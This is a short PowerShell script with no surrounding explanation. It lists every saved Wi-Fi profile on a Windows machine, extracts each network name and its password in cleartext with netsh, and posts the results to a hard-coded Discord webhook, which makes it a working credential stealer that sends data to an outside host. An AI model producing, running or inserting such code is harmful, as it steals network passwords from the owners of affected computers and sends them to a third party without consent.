$profiles = (netsh wlan show profiles) |
    Select-String "\:(.+)$" |
    ForEach-Object { $name=$_.Matches.Value.TrimStart(": "); $name } |
    ForEach-Object { netsh wlan show profile name="$_" key=clear } |
    Select-String "SSID name|Key Content"

$message = "Saved Wi-Fi profiles:`n" + ($profiles -join "`n")

$body = @{
    content = $message
} | ConvertTo-Json

Invoke-RestMethod `
    -Uri "https://discord.com/api/webhooks/1510389267241631754/bsEM-H8cxl_Cu7o8Kj5-rOCXAxzMdme_WKZI2vKN3vDCTMKQo5pxT5MT34YYXInQQlpT" `
    -Method Post `
    -ContentType "application/json" `
    -Body $body
